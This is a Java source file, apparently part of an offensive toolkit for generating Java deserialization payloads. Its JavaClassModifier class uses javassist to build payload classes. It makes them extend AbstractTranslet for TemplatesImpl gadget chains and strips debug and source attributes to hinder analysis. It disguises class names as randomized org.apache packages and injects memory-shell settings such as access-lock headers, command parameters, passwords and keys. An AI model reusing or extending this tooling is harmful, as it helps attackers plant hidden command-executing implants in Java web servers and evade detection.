package com.ppp.middleware.builder;

import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.annotation.JavaClassModifiable;
import com.ppp.utils.maker.AnnotationUtils;
import com.ppp.utils.maker.CryptoUtils;
import com.ppp.utils.maker.JavaClassUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.bytecode.*;

import java.net.URL;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

/**
 * @author Whoopsunix
 */
public class JavaClassModifier {
    public static void ctClassBuilderNew(Class localCls, CtClass ctClass, JavaClassHelper javaClassHelper) throws Exception {
        ctClass.rebuildClassFile();
        // 继承 AbstractTranslet
        if (javaClassHelper.isExtendsAbstractTranslet()) {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            CtClass superCtClass = pool.get(AbstractTranslet.class.getName());
            ctClass.setSuperclass(superCtClass);
            Printer.yellowInfo("extends AbstractTranslet");
        }

        // 清除所有注解
        JavaClassUtils.clearAllAnnotations(ctClass);

        // 随机类名
        if ((javaClassHelper.isLoader() || javaClassHelper.getCLASSNAME() == null) && javaClassHelper.isRandomJavaClassName()) {
            String randomJavaClassName = randomJavaClassName(javaClassHelper);
            // 修改类名
            ctClass.setName(randomJavaClassName);
        }

        // 根据随机类名赋予字段值
        if (localCls != null)
            fieldChange(localCls, ctClass, javaClassHelper);

        if (javaClassHelper.getCLASSNAME() == null)
            javaClassHelper.setCLASSNAME(ctClass.getName());

        // 移除类文件属性
        ClassFile classFile = ctClass.getClassFile();
        // 源文件信息
        classFile.removeAttribute(SourceFileAttribute.tag);
        // 移除行号信息
        classFile.removeAttribute(LineNumberAttribute.tag);
        classFile.removeAttribute(LocalVariableAttribute.tag);
        classFile.removeAttribute(LocalVariableAttribute.typeTag);
        classFile.removeAttribute(DeprecatedAttribute.tag);
        classFile.removeAttribute(SignatureAttribute.tag);
        classFile.removeAttribute(StackMapTable.tag);


        Printer.blueInfo("JavaClass Name: " + ctClass.getName());
    }

    public static byte[] toBytes(CtClass ctClass) throws Exception {
        byte[] classBytes = ctClass.toBytecode();

        // jdk5
//        ctClass.getClassFile().setVersionToJava5();
//        byte[] classBytes = ctClass.toBytecode();
        // jdk 5
//        classBytes[7] = 49;
//
//        // jdk1.6
//        ctClass.defrost();
//        ctClass.getClassFile().setMajorVersion(50);
        classBytes[7] = 50;

        Printer.blueInfo("JavaClass: " + CryptoUtils.base64encoder(classBytes));

        return classBytes;
    }

    public static void saveCtClass(CtClass ctClass, JavaClassHelper javaClassHelper) throws Exception {
        ctClass.writeFile("/tmp");
    }

    /**
     * 内存马、RceEcho 回显的字段
     *
     * @param cls
     * @param ctClass
     * @param javaClassHelper
     * @throws Exception
     */
    public static void fieldChange(Class cls, CtClass ctClass, JavaClassHelper javaClassHelper) throws Exception {
        // 适用于自定义内存马的时候 直接跳过
        if (javaClassHelper == null)
            return;

        // 内存马约束请求头
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.lockHeaderKey) && AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.lockHeaderValue)) {
            String lockHeaderKey = javaClassHelper.getLockHeaderKey();
            String lockHeaderValue = javaClassHelper.getLockHeaderValue();

            Printer.yellowInfo(String.format("Header %s must contain: %s", lockHeaderKey, lockHeaderValue));
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.lockHeaderKey, String.format("private static String %s = \"%s\";", JavaClassModifiable.lockHeaderKey, lockHeaderKey));
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.lockHeaderValue, String.format("private static String %s = \"%s\";", JavaClassModifiable.lockHeaderValue, lockHeaderValue));
        }

        // 内存马类名
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.CLASSNAME)) {
            String classname = javaClassHelper.getCLASSNAME();
            Printer.yellowInfo(String.format("MS Class Name: %s", classname));
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.CLASSNAME, String.format("private static String %s = \"%s\";", JavaClassModifiable.CLASSNAME, classname));
        }

        // 参数
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.NAME)) {
            String name = javaClassHelper.getNAME();
            Printer.yellowInfo(String.format("Name: %s", name));
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.NAME, String.format("private static String %s = \"%s\";", JavaClassModifiable.NAME, name));
        }
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.HEADER)) {
            String header = javaClassHelper.getHEADER();
            Printer.yellowInfo(String.format("Exec Header: %s", header));
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.HEADER, String.format("private static String %s = \"%s\";", JavaClassModifiable.HEADER, header));
        }
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.PARAM)) {
            String param = javaClassHelper.getPARAM();
            Printer.yellowInfo(String.format("Exec Param: %s", param));
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.PARAM, String.format("private static String %s = \"%s\";", JavaClassModifiable.PARAM, param));
        }
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.PATH)) {
            String path = javaClassHelper.getPATH();
            Printer.yellowInfo(String.format("Path: %s", path));
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.PATH, String.format("private static String %s = \"%s\";", JavaClassModifiable.PATH, path));
        }

        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.pass)) {
            String pass = javaClassHelper.getPass();
            Printer.yellowInfo(String.format("pass: %s", pass));
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.pass, String.format("private static String %s = \"%s\";", JavaClassModifiable.pass, pass));
        }
        if (AnnotationUtils.containsValue(cls, JavaClassModifiable.class, JavaClassModifiable.key)) {
            String key = javaClassHelper.getKey();
            Printer.yellowInfo(String.format("key: %s", key));
            JavaClassUtils.fieldChangeIfExist(ctClass, JavaClassModifiable.key, String.format("private static String %s = \"%s\";", JavaClassModifiable.key, key));
        }
    }

    /**
     * 生成随机包类名
     * 借鉴了 su18 ysuserial 的思路重新实现
     *
     * @return
     */
    public static String randomJavaClassName(JavaClassHelper javaClassHelper) {
        // 真实包名
        String realPackageName = "org.apache";
        String javaClassPackageHost = javaClassHelper.getJavaClassPackageHost();

        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Set<String> classNames = getClassNamesFromPackage(classLoader, realPackageName);

        // 随机获取一个类名
        Object[] array = classNames.toArray();
        int randomIndex = new Random().nextInt(array.length);
        String originalClassName = (String) array[randomIndex];

        // 随机组合
        List<String> parts = Arrays.asList(originalClassName.replace(realPackageName + ".", "").split("\\."));
        Collections.shuffle(parts);

        StringBuilder javaClassName = new StringBuilder();
        if (javaClassPackageHost != null) {
            Printer.yellowInfo("javaClass Package Host: " + javaClassPackageHost);
            javaClassName.append(javaClassPackageHost);
        } else {
            javaClassName.append(realPackageName);
        }

        for (int i = 0; i < parts.size(); i++) {
            String part = parts.get(i).toLowerCase();

            if (i == parts.size() - 1) {
                part = part.substring(0, 1).toUpperCase() + part.substring(1);
            }
            if (javaClassName.length() > 0) {
                javaClassName.append(".");
            }
            part = part.replaceAll("\\d", "");
            javaClassName.append(part);
        }

        return javaClassName.toString();
    }

    /**
     * 获取真实类名
     *
     * @param classLoader
     * @param packageName
     * @return
     */
    public static Set<String> getClassNamesFromPackage(ClassLoader classLoader, String packageName) {
        Set<String> classNames = new HashSet();

        packageName = packageName.replace('.', '/');
        Enumeration<URL> resources;
        try {
            resources = classLoader.getResources(packageName);
            while (resources.hasMoreElements()) {
                URL resource = resources.nextElement();
                classNames.addAll(getClassNamesFromResource(resource, packageName));
            }
        } catch (Exception e) {

        }

        return classNames;
    }

    public static Set<String> getClassNamesFromResource(URL resource, String packageName) {
        Set<String> classNames = new HashSet();
        String protocol = resource.getProtocol();

        if ("jar".equals(protocol)) {
            classNames.addAll(getClassNamesFromJar(resource, packageName));
        }

        return classNames;
    }

    public static Set<String> getClassNamesFromJar(URL resource, String packageName) {
        Set<String> classNames = new HashSet();

        String jarPath = resource.getPath().split("!")[0].replace("file:", "");
        try (JarFile jarFile = new JarFile(jarPath)) {
            Enumeration<JarEntry> entries = jarFile.entries();

            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String entryName = entry.getName();
                // 内部类处理起来太麻烦不要了
                if (entryName.startsWith(packageName) && entryName.endsWith(".class") && !entryName.contains("$")) {
                    String className = entryName.replace('/', '.').replace(".class", "");
                    classNames.add(className);
                }
            }
        } catch (Exception e) {

        }

        return classNames;
    }


}
